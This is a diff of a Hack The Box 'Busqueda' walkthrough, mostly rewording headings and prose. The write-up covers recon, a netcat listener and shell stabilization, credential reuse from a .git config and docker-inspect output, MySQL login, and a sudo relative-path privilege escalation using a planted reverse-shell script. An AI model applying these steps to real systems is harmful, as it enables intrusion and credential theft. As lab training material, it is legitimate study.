@@ -33,7 +33,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 ```
 
-To-do list:
+Next steps:
 
 | **Step** | **Description**                          |
 |----------|------------------------------------------|
@@ -90,7 +90,7 @@ gitea                   [Status: 200, Size: 13237, Words: 1009, Lines: 268, Dura
 :: Progress: [151265/151265] :: Job [1/1] :: 1408 req/sec :: Duration: [0:02:30] :: Errors: 0 ::
 ```
 
-To-do list:
+Next steps:
 
 | **Step** | **Description**                                             |
 |----------|-------------------------------------------------------------|
@@ -140,7 +140,7 @@ Based on [testdriven.io](https://testdriven.io/blog/what-is-werkzeug/):
 
 Searching known vulns for `Werkzeug/2.1.2` and `Python/3.10.6` did not return anything of interest.
 
-To-do list:
+Next steps:
 
 | **Step** | **Description**                                                                         |
 |----------|-----------------------------------------------------------------------------------------|
@@ -219,7 +219,7 @@ Search known vulns for `Gitea 1.18.0` gives us nothing back. Let's try our brute
 
 	Unfortunately, nothing comes back!
 
-To-do list:
+Next steps:
 
 | **Step** | **Description**                                                                               |
 |----------|-----------------------------------------------------------------------------------------------|
@@ -228,7 +228,7 @@ To-do list:
 
 ## Privilege escalation
 
-Stabilize shell
+Stabilize shell:
 
 ```bash
 # stabilize shell
@@ -247,9 +247,7 @@ nc -lvnp 9001
 svc@busqueda:/var/www/app$
 ```
 
-### Search for privilege escalation paths
-
-#### SUIDS
+Search for privilege escalation paths:
 
 ```bash
 # search for SUID files
@@ -282,7 +280,7 @@ svc@busqueda:/var/www/app$ find / -perm -u=s 2>/dev/null
 /snap/snapd/18357/usr/lib/snapd/snap-confine
 ```
 
-#### Kernel and OS version
+Check kernel and OS version:
 
 ```bash
 # check kernel version
@@ -305,7 +303,7 @@ PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-poli
 UBUNTU_CODENAME=jammy
 ```
 
-#### Sensitive data and config files
+Search for sensitive data and config files:
 
 ```bash
 svc@busqueda:/var/www/app$ ls -la
@@ -330,21 +328,21 @@ svc@busqueda:/var/www/app/.git$ cat .git/config
         merge = refs/heads/main
 ```
 
-We already know that there is a user `cody`, and the above looks like its credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can try logging in as well as use the same creds to SSH either as `cody` or `svc`:
+We already know that there is a user `cody`, and the above file looks like it contains `cody`'s credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can try using them for SSH access as well for both users, i.e., `cody` or `svc`:
 
 ![](gitea_cody.png)
 
-Not much we can do from the sub-domain. Let's try to SSH:
+Not much we can do from the sub-domain with a low-privileged account. Let's try to SSH:
 
 ```bash
-# SSH as cody
+# ssh as cody
 ssh cody@10.10.11.208
-cody@10.10.11.208's password:
+cody@10.10.11.208s password:
 Permission denied, please try again.
 
 # ssh as svc
 ssh svc@10.10.11.208
-svc@10.10.11.208's password:
+svc@10.10.11.208s password:
 svc@busqueda:~$
 ```
 
@@ -366,7 +364,7 @@ svc@busqueda:/$ ls -la /opt/scripts/system-checkup.py
 -rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
 ```
 
-We can't read the file, but the asterisk (`*`) at the end means that when `system-checkup.py` is executed, it also executes all the files within its directory:
+We can't read or modify the file's content as we have no read (`r`) or write (`w`) access, but we can execute it (`x`):
 
 ```bash
 # list directory contents
@@ -383,11 +381,7 @@ drwxr-x--- 8 root root 4096 Apr  3  2023 .git
 # check directory permissions
 svc@busqueda:/$ ls -ld /opt/scripts
 drwxr-xr-x 3 root root 4096 Dec 24  2022 /opt/scripts
-```
 
-It seems that we can't read or modify anything within the `scripts` directory. Let's just execute it then:
-
-```bash
 # execute the script
 svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
 [sudo] password for svc:
@@ -434,7 +428,7 @@ svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
 <SNIP>
 ```
 
-It seems that it contains some credentials: `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF`, `MYSQL_USER=gitea`, and `MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh`. We can check if an MySQL server is listening and if it is, then trying logging in:
+The docker image above contains some credentials: `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF`, `MYSQL_USER=gitea`, and `MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh`. We can check if a MySQL server is listening and if there is one, try to log into it:
 
 ```bash
 # log into mysql
@@ -462,43 +456,7 @@ mysql> select * from user limit 1 \G
 email_notifications_preference: enabled
                         passwd: ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
               passwd_hash_algo: pbkdf2
-          must_change_password: 0
-                    login_type: 0
-                  login_source: 0
-                    login_name:
-                          type: 0
-                      location:
-                       website:
-                         rands: 44748ed806accc9d96bf9f495979b742
-                          salt: a378d3f64143b284f104c926b8b49dfb
-                      language: en-US
-                   description:
-                  created_unix: 1672857920
-                  updated_unix: 1680531979
-               last_login_unix: 1673083022
-          last_repo_visibility: 1
-             max_repo_creation: -1
-                     is_active: 1
-                      is_admin: 1
-                 is_restricted: 0
-                allow_git_hook: 0
-            allow_import_local: 0
-     allow_create_organization: 1
-                prohibit_login: 0
-                        avatar:
-                  avatar_email: administrator@gitea.searcher.htb
-             use_custom_avatar: 0
-                 num_followers: 0
-                 num_following: 0
-                     num_stars: 0
-                     num_repos: 1
-                     num_teams: 0
-                   num_members: 0
-                    visibility: 0
- repo_admin_change_team_access: 0
-               diff_view_style:
-                         theme: auto
-         keep_activity_private: 0
+<SNIP>
 1 row in set (0.00 sec)
 
 ERROR:
@@ -514,11 +472,11 @@ mysql> select name, passwd from user;
 2 rows in set (0.00 sec)
 ```
 
-We have found some hashed passwords, but we already have the password for `cody` as well as the `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF` which we haven't used yet. Let's try logging in `gitea.searcher.htb` as `administrator:jI86kGUuj87guWr3RyF` or `administrator:yuiu1hoiu4i5ho1uh` prior trying to crack the hashes:
+We have found 2 hashed passwords, but we already have the password for `cody` as well as the `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF` which we haven't used yet. Let's try logging in `gitea.searcher.htb` as `administrator:jI86kGUuj87guWr3RyF` or `administrator:yuiu1hoiu4i5ho1uh` prior trying to crack the hashes:
 
 ![](gitea_admin.png)
 
-The second pair of creds worked; we have now admin access to the sub-domain. We can see the `system-checkup.py` script which we can run as `root` with the `svc` user. Upon inspecting the script, we notice that there is a `./full-checkup.sh` argument:
+The second pair of creds worked; we have now admin access to the sub-domain. We can now read the contents of the `system-checkup.py` script, which we can run as `root` with the `svc` user. Upon inspecting the script, we notice that there is a `./full-checkup.sh` argument:
 
 ```python
     elif action == 'full-checkup':
@@ -531,7 +489,7 @@ The second pair of creds worked; we have now admin access to the sub-domain. We 
             exit(1)
 ```
 
-The argument is referenced using a relative path (`./full-checkup.sh`) instead of an absolute path (`/opt/scripts/full-checkup.sh`), which means that script will look for the file from the directory where it is been executed. As a result, we could change to a directory where `svc` has write privileges, create a revershe shell script named `full-checkup.sh` and then execute `system-checkup.py` with `sudo` which will results in giving us a `root` revershe shell back:
+The argument is referenced using a relative path (`./full-checkup.sh`) instead of an absolute path (`/opt/scripts/full-checkup.sh`), which means that the script will pick up the file from the directory where it is been executed. As a result, we could change to a directory where `svc` has write privileges, such as his home directory (`~/`) or `/tmp`, create a revershe shell script named `full-checkup.sh`, and then execute `system-checkup.py` using `sudo`. This process will result in giving us a `root` revershe shell back:
 
 >_More info about relative vs. absolute paths [here](https://cspanias.github.io/posts/HTB-Precious/#extra)._
 
